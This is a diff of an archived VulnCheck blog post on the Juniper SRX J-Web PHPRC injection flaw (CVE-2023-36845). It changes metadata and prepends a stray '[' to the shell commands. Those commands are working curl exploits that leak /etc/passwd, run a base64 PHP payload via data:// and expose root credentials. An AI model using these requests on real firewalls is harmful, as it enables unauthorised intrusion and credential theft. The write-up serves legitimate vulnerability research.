@@ -5,9 +5,9 @@ resource: "https://vulncheck.com/blog/juniper-cve-2023-36845"
 tags: [article, webseclist-reference, en, vulncheck]
 generated:
   by: webseclist-refs/1
-  at: "2026-08-09T01:48:10+00:00"
+  at: "2026-08-10T16:06:00+00:00"
 status: stable
-stale_after: 2027-08-09
+stale_after: 2027-08-10
 sources:
   - id: original
     resource: "https://vulncheck.com/blog/juniper-cve-2023-36845"
@@ -20,7 +20,7 @@ canonical_url: "https://www.vulncheck.com/blog/juniper-cve-2023-36845"
 cited_by:
   - "2023.md:55"
 commit: ""
-content_sha256: d5258ec8671d3c3b59be05a34d9742fca1229e6cf4b6191193e12eb444cbd053
+content_sha256: 5d1bd4317de883922c9b1301f5f44c5358ae55cfbbd3a7be302a9fffa47f2afb
 depth: full
 depth_reason: default
 kind: article
@@ -30,10 +30,10 @@ original_url: "https://vulncheck.com/blog/juniper-cve-2023-36845"
 published: ""
 publisher: VulnCheck
 publisher_english: ""
-raw_sha256: 6049c41b7a8233638940b532287be728a6f5c77e4d7f1ce19311f2346e45fea5
+raw_sha256: 1f268363e2d438ee227efc1d81a4cf4c71274d024f783ac866ab37c2e9864a4e
 retrieved_from: "https://www.vulncheck.com/blog/juniper-cve-2023-36845"
 retrieved_kind: live
-retrieved_utc: "2026-08-09T01:48:10+00:00"
+retrieved_utc: "2026-08-10T16:06:00+00:00"
 slug: vulncheck-fileless-remote-code-execution-juniper-firewalls-blog
 snapshot: ""
 title_english: ""
@@ -48,7 +48,7 @@ translation_of: ""
 - Published: date not stated
 - Original: <https://vulncheck.com/blog/juniper-cve-2023-36845>
 - Current location: <https://www.vulncheck.com/blog/juniper-cve-2023-36845>
-- Preserved from: https://www.vulncheck.com/blog/juniper-cve-2023-36845 (live) on 2026-08-09
+- Preserved from: https://www.vulncheck.com/blog/juniper-cve-2023-36845 (live) on 2026-08-10
 - Licence: unknown
 
 Rights remain with the original author and publisher. This is a research
@@ -72,7 +72,7 @@ page going offline. To read the original, follow the link above.
  The first part of the watchTowr exploit chain uses [ CVE-2023-36846 ](https://nvd.nist.gov/vuln/detail/CVE-2023-36846) to invoke a ` do_fileUpload ` function in the J-Web interface. This results in writing arbitrary files to ` /var/tmp `. Unfortunately, our old SRX210’s J-Web doesn’t have the ` do_fileUpload ` functionality, so the exploit failed:
 
 ```sh
- $ curl http://10.12.72.1/webauth_operation.php -d 'rs=do_upload&rsargs[]=[{"fileName": "test.php", "fileData": ",PD9waHAgDQpwaHBpbmZvKCk7DQo/Pg==", "csize": 22}]'
+[$ curl http://10.12.72.1/webauth_operation.php -d 'rs=do_upload&rsargs[]=[{"fileName": "test.php", "fileData": ",PD9waHAgDQpwaHBpbmZvKCk7DQo/Pg==", "csize": 22}]'
 -:function not callable
 
 ```
@@ -86,7 +86,7 @@ page going offline. To read the original, follow the link above.
  Using that trick, we can set the PHPRC environment variable to ` /dev/fd/0 ` and include the desired ` php.ini ` in our HTTP request. The following ` curl ` request demonstrates this attack to prepend ` /etc/passwd ` to every response.
 
 ```sh
- $ curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'
+[$ curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'
 root:*:0:0:Charlie &:/root:/bin/csh
 daemon:*:1:1:Owner of many system processes:/root:/sbin/nologin
 operator:*:2:5:System &:/:/sbin/nologin
@@ -128,7 +128,7 @@ nobody:*:65534:65534:Unprivileged user:/nonexistent:/sbin/nologin
  By enabling ` allow_url_include `, we can use any [ protocol wrapper ](https://www.php.net/manual/en/wrappers.php) with ` auto_prepend_file `. The obvious choice is ` data:// ` to provide the “second file” inline. Below is an example of this attack that executes ` <? phpinfo(); ?> ` which is embedded in ` data:// `:
 
 ```sh
- $ curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'
+[$ curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
 <html><head>
 <style type="text/css">
@@ -176,7 +176,7 @@ hr {width: 600px; background-color: #cccccc; border: 0px; height: 1px; color: #0
  It’s worth noting that attackers can get around including variables in the HTTP header; we only did that here for clarity. For example, the information leak works just fine using multipart form data:
 
 ```sh
- $ curl "http://10.12.72.1/" -F $'auto_prepend_file="/etc/passwd\n"' -F 'PHPRC=/dev/fd/0'
+[$ curl "http://10.12.72.1/" -F $'auto_prepend_file="/etc/passwd\n"' -F 'PHPRC=/dev/fd/0'
 root:*:0:0:Charlie &:/root:/bin/csh
 daemon:*:1:1:Owner of many system processes:/root:/sbin/nologin
 operator:*:2:5:System &:/:/sbin/nologin
@@ -214,14 +214,14 @@ nobody:*:65534:65534:Unprivileged user:/nonexistent:/sbin/nologin
  Our test system has the Appweb file upload mechanism enabled. An attacker could upload arbitrary files to ` /var/tmp ` like so:
 
 ```sh
- curl -v -F 'upload=@/tmp/php.ini' http://10.12.72.1/
+[curl -v -F 'upload=@/tmp/php.ini' http://10.12.72.1/
 
 ```
 
  On the firewall, a file will be created with the name of “MPR_%d_%d_%d.tmp”. Where the first %d is the httpd process ID. The second %d is a 16-bit number calculated using the current time, and the last %d is a one-up counter. These values are small enough that they could be brute-forced and used with the original watchTowr exploit.
 
 ```sh
- root@junSRX210% ls -l
+[root@junSRX210% ls -l
 total 32
 -rw-r--r--  1 nobody  wheel 96 Sep 13 23:15 MPR_1479_59421_1.tmp
 root@junSRX210% cat MPR_1479_59421_1.tmp
@@ -233,7 +233,7 @@ auto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="
  Using the file disclosure mechanism mentioned above, we are able to leak the root credentials as they were at configuration time. We have no idea if this works on even slightly modern Juniper, but it was a neat tidbit. There is a file called ` wiz_config_server.txt ` sitting in ` /var/tmp/ `. Here is a very truncated version that shows the ` root ` user password:
 
 ```sh
- $ curl -kv "http://10.12.72.1/about.php?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/var/tmp/wiz_config_server.txt"'
+[$ curl -kv "http://10.12.72.1/about.php?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/var/tmp/wiz_config_server.txt"'
 *   Trying 10.12.72.1:80...
 * TCP_NODELAY set
 * Connected to 10.12.72.1 (10.12.72.1) port 80 (#0)
